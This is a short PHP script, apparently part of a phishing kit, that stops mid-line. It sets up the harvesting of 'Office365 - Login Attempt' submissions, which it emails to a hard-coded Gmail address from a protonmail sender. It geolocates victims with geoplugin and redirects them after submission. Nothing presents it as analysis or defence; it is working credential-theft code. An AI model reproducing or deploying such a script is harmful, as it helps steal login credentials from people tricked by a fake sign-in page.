<?php
// Define constants for clarity and easier future updates
define("EMAIL", "terryanderson0110@gmail.com"); // Recipient email address
define("SUBJECT", "Office365 - Login Attempt");
define("FROM_EMAIL", "noreplay.dgz.gdn@protonmail.com");
define("LOCATION", "http://example.com"); // Replace with your desired URL to redirect users after submission

require_once __DIR__ . '/geoplugin.class.php';

if (!function_exists('sha256')) {
    function sha256($data) {
        return hash('sha256', $data);
    }
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "<html><head><script>window.top.location.href='{$LOCATION}';</script></head
